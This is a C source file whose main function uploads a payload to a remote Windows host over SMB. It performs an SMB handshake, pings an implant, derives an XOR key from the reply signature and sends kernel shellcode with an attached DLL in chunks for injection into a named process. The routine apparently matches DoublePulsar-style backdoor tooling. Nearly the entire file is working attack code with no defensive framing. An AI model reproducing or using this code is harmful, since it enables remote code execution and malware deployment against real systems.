#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

static int upload_send_all(SOCKET socket_handle, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(socket_handle, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0) {
            return -1;
        }
        sent += (size_t)result;
    }

    return 0;
}

static int upload_recv_all(SOCKET socket_handle, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(socket_handle, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0) {
            return -1;
        }
        received += (size_t)result;
    }

    return 0;
}

static int upload_recv_frame(SOCKET socket_handle, uint8_t **frame, size_t *frame_length)
{
    uint8_t header[4];
    size_t body_length;
    uint8_t *buffer;

    *frame = NULL;
    *frame_length = 0;

    if (upload_recv_all(socket_handle, header, sizeof(header)) != 0) {
        return -1;
    }

    body_length = ((size_t)header[1] << 16) |
                  ((size_t)header[2] << 8) |
                  (size_t)header[3];
    if (body_length > SIZE_MAX - sizeof(header)) {
        return -1;
    }

    buffer = (uint8_t *)malloc(sizeof(header) + body_length);
    if (buffer == NULL) {
        return -1;
    }

    memcpy(buffer, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_all(socket_handle, buffer + sizeof(header), body_length) != 0) {
        free(buffer);
        return -1;
    }

    *frame = buffer;
    *frame_length = sizeof(header) + body_length;
    return 0;
}

static void upload_put_le16(uint8_t *buffer, size_t offset, uint16_t value)
{
    buffer[offset] = (uint8_t)(value & 0xffu);
    buffer[offset + 1] = (uint8_t)((value >> 8) & 0xffu);
}

static void upload_put_le32(uint8_t *buffer, size_t offset, uint32_t value)
{
    buffer[offset] = (uint8_t)(value & 0xffu);
    buffer[offset + 1] = (uint8_t)((value >> 8) & 0xffu);
    buffer[offset + 2] = (uint8_t)((value >> 16) & 0xffu);
    buffer[offset + 3] = (uint8_t)((value >> 24) & 0xffu);
}

static void xor_buffer(uint8_t *buffer, size_t length, uint32_t key)
{
    uint8_t key_bytes[4];
    size_t i;

    key_bytes[0] = (uint8_t)(key & 0xffu);
    key_bytes[1] = (uint8_t)((key >> 8) & 0xffu);
    key_bytes[2] = (uint8_t)((key >> 16) & 0xffu);
    key_bytes[3] = (uint8_t)((key >> 24) & 0xffu);

    for (i = 0; i < length; ++i) {
        buffer[i] ^= key_bytes[i & 3u];
    }
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET socket_handle = INVALID_SOCKET;
    struct sockaddr_storage address;
    int address_length = 0;
    HANDLE file_handle = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    uint8_t *dll_data = NULL;
    uint8_t *payload = NULL;
    uint8_t *packet = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_size = 0;
    size_t payload_size = 0;
    uint16_t user_id;
    uint16_t tree_id;
    uint32_t key;
    uint32_t signature;
    uint32_t inject_hash = 0;
    size_t i;
    int wsa_started = 0;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535) {
        return -1;
    }

    file_handle = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }
    if (!GetFileSizeEx(file_handle, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > UINT32_MAX) {
        goto cleanup;
    }
    dll_size = (size_t)file_size.QuadPart;
    if (dll_size > SIZE_MAX - (size_t)KERNEL_RUNDLL_SIZE) {
        goto cleanup;
    }
    payload_size = (size_t)KERNEL_RUNDLL_SIZE + dll_size;
    if (payload_size > UINT32_MAX || dll_size > UINT32_MAX - 3978u) {
        goto cleanup;
    }

    if (dll_size != 0) {
        dll_data = (uint8_t *)malloc(dll_size);
        if (dll_data == NULL) {
            goto cleanup;
        }

        {
            size_t offset = 0;
            while (offset < dll_size) {
                size_t remaining = dll_size - offset;
                DWORD amount = remaining > (size_t)MAXDWORD ? MAXDWORD : (DWORD)remaining;
                DWORD bytes_read = 0;
                if (!ReadFile(file_handle, dll_data + offset, amount, &bytes_read, NULL) ||
                    bytes_read == 0) {
                    goto cleanup;
                }
                offset += (size_t)bytes_read;
            }
        }
    }

    if (!CloseHandle(file_handle)) {
        file_handle = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    file_handle = INVALID_HANDLE_VALUE;

    payload = (uint8_t *)malloc(payload_size == 0 ? 1 : payload_size);
    if (payload == NULL) {
        goto cleanup;
    }
    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    if (dll_size != 0) {
        memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll_data, dll_size);
    }

    if ((size_t)KERNEL_RUNDLL_TOTAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_TOTAL_OFFSET < 4u ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET < 4u ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET < 4u ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_HASH_OFFSET < 4u) {
        goto cleanup;
    }

    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_TOTAL_OFFSET,
                    (uint32_t)(dll_size + 3978u));
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET, (uint32_t)dll_size);
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET, 1u);

    for (i = 0; i < strlen(TARGET_INJECT_PROCESS); ++i) {
        inject_hash = inject_hash * 127u + (uint8_t)TARGET_INJECT_PROCESS[i];
    }
    upload_put_le32(payload, (size_t)KERNEL_RUNDLL_HASH_OFFSET, inject_hash);

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        goto cleanup;
    }
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    {
        struct sockaddr_in *ipv4 = (struct sockaddr_in *)&address;
        struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)&address;

        if (InetPtonA(AF_INET, ip, &ipv4->sin_addr) == 1) {
            ipv4->sin_family = AF_INET;
            ipv4->sin_port = htons((u_short)port);
            address_length = (int)sizeof(*ipv4);
            socket_handle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        } else if (InetPtonA(AF_INET6, ip, &ipv6->sin6_addr) == 1) {
            ipv6->sin6_family = AF_INET6;
            ipv6->sin6_port = htons((u_short)port);
            address_length = (int)sizeof(*ipv6);
            socket_handle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        } else {
            goto cleanup;
        }
    }

    if (socket_handle == INVALID_SOCKET ||
        connect(socket_handle, (const struct sockaddr *)&address, address_length) == SOCKET_ERROR) {
        goto cleanup;
    }

    if (upload_send_all(socket_handle, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        upload_recv_frame(socket_handle, &response, &response_length) != 0) {
        goto cleanup;
    }
    free(response);
    response = NULL;

    if (upload_send_all(socket_handle, SMB_SESSION_SETUP_PKT,
                        sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        upload_recv_frame(socket_handle, &response, &response_length) != 0) {
        goto cleanup;
    }
    if (response_length < 34u) {
        goto cleanup;
    }
    user_id = (uint16_t)response[32] | (uint16_t)((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    if (sizeof(SMB_TREE_CONNECT_PKT) - 1 < 34u) {
        goto cleanup;
    }
    packet = (uint8_t *)malloc(sizeof(SMB_TREE_CONNECT_PKT) - 1);
    if (packet == NULL) {
        goto cleanup;
    }
    memcpy(packet, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT) - 1);
    packet[32] = (uint8_t)(user_id & 0xffu);
    packet[33] = (uint8_t)((user_id >> 8) & 0xffu);
    if (upload_send_all(socket_handle, packet, sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
        upload_recv_frame(socket_handle, &response, &response_length) != 0) {
        goto cleanup;
    }
    free(packet);
    packet = NULL;
    if (response_length < 30u) {
        goto cleanup;
    }
    tree_id = (uint16_t)response[28] | (uint16_t)((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    if (sizeof(DP_PING_PKT) - 1 < 34u) {
        goto cleanup;
    }
    packet = (uint8_t *)malloc(sizeof(DP_PING_PKT) - 1);
    if (packet == NULL) {
        goto cleanup;
    }
    memcpy(packet, DP_PING_PKT, sizeof(DP_PING_PKT) - 1);
    packet[28] = (uint8_t)(tree_id & 0xffu);
    packet[29] = (uint8_t)((tree_id >> 8) & 0xffu);
    packet[32] = (uint8_t)(user_id & 0xffu);
    packet[33] = (uint8_t)((user_id >> 8) & 0xffu);
    if (upload_send_all(socket_handle, packet, sizeof(DP_PING_PKT) - 1) != 0 ||
        upload_recv_frame(socket_handle, &response, &response_length) != 0) {
        goto cleanup;
    }
    free(packet);
    packet = NULL;

    if ((size_t)SMB_RESP_SIGNATURE_START > response_length ||
        response_length - (size_t)SMB_RESP_SIGNATURE_START < 4u) {
        goto cleanup;
    }
    signature = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
                ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    key = (2u * signature) ^
          (((((signature >> 16) | (signature & 0x00ff0000u)) >> 8) |
            (((signature << 16) | (signature & 0x0000ff00u)) << 8)));
    free(response);
    response = NULL;

    xor_buffer(payload, payload_size, key);

    {
        size_t offset = 0;

        while (offset < payload_size) {
            size_t chunk_size = payload_size - offset;
            size_t packet_length;
            uint32_t parameters[3];

            if (chunk_size > (size_t)SMB_EXEC_SHELLCODE_LEN) {
                chunk_size = (size_t)SMB_EXEC_SHELLCODE_LEN;
            }
            if (chunk_size > UINT16_MAX ||
                chunk_size > SIZE_MAX - (size_t)SMB_EXEC_TEMPLATE_LEN - 12u) {
                goto cleanup;
            }
            packet_length = (size_t)SMB_EXEC_TEMPLATE_LEN + 12u + chunk_size;
            if (packet_length < 4u || packet_length - 4u > 0x00ffffffu ||
                (size_t)SMB_EXEC_TEMPLATE_LEN < 70u ||
                (size_t)SMB_NETBIOS_LEN_OFFSET > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN - (size_t)SMB_NETBIOS_LEN_OFFSET < 3u ||
                (size_t)SMB_EXEC_TOTAL_DATA_OFFSET > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN - (size_t)SMB_EXEC_TOTAL_DATA_OFFSET < 2u ||
                (size_t)SMB_EXEC_DATA_COUNT_OFFSET > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN - (size_t)SMB_EXEC_DATA_COUNT_OFFSET < 2u ||
                (size_t)SMB_EXEC_BYTE_COUNT_OFFSET > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN - (size_t)SMB_EXEC_BYTE_COUNT_OFFSET < 2u ||
                (size_t)SMB_TID_OFFSET > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN - (size_t)SMB_TID_OFFSET < 2u ||
                (size_t)SMB_UID_OFFSET > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN - (size_t)SMB_UID_OFFSET < 2u) {
                goto cleanup;
            }

            packet = (uint8_t *)malloc(packet_length);
            if (packet == NULL) {
                goto cleanup;
            }
            memcpy(packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);

            parameters[0] = (uint32_t)payload_size;
            parameters[1] = (uint32_t)chunk_size;
            parameters[2] = (uint32_t)offset;
            upload_put_le32(packet, (size_t)SMB_EXEC_TEMPLATE_LEN, parameters[0]);
            upload_put_le32(packet, (size_t)SMB_EXEC_TEMPLATE_LEN + 4u, parameters[1]);
            upload_put_le32(packet, (size_t)SMB_EXEC_TEMPLATE_LEN + 8u, parameters[2]);
            xor_buffer(packet + (size_t)SMB_EXEC_TEMPLATE_LEN, 12u, key);

            packet[SMB_NETBIOS_LEN_OFFSET] =
                (uint8_t)(((packet_length - 4u) >> 16) & 0xffu);
            packet[SMB_NETBIOS_LEN_OFFSET + 1] =
                (uint8_t)(((packet_length - 4u) >> 8) & 0xffu);
            packet[SMB_NETBIOS_LEN_OFFSET + 2] =
                (uint8_t)((packet_length - 4u) & 0xffu);
            upload_put_le16(packet, (size_t)SMB_EXEC_TOTAL_DATA_OFFSET,
                            (uint16_t)chunk_size);
            upload_put_le16(packet, (size_t)SMB_EXEC_DATA_COUNT_OFFSET,
                            (uint16_t)chunk_size);
            upload_put_le16(packet, (size_t)SMB_EXEC_BYTE_COUNT_OFFSET,
                            (uint16_t)(chunk_size + 12u));
            upload_put_le16(packet, (size_t)SMB_TID_OFFSET, tree_id);
            upload_put_le16(packet, (size_t)SMB_UID_OFFSET, user_id);
            memcpy(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + 12u,
                   payload + offset, chunk_size);

            if (upload_send_all(socket_handle, packet, packet_length) != 0 ||
                upload_recv_frame(socket_handle, &response, &response_length) != 0) {
                goto cleanup;
            }
            free(packet);
            packet = NULL;

            if (offset + chunk_size == payload_size) {
                if ((size_t)DP_RESP_MUX_ID_OFFSET >= response_length ||
                    response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC) {
                    goto cleanup;
                }
                result = 0;
            }

            free(response);
            response = NULL;
            offset += chunk_size;
        }
    }

cleanup:
    if (response != NULL) {
        free(response);
    }
    if (packet != NULL) {
        free(packet);
    }
    if (payload != NULL) {
        free(payload);
    }
    if (dll_data != NULL) {
        free(dll_data);
    }
    if (file_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(file_handle);
    }
    if (socket_handle != INVALID_SOCKET) {
        closesocket(socket_handle);
    }
    if (wsa_started) {
        WSACleanup();
    }
    return result;
}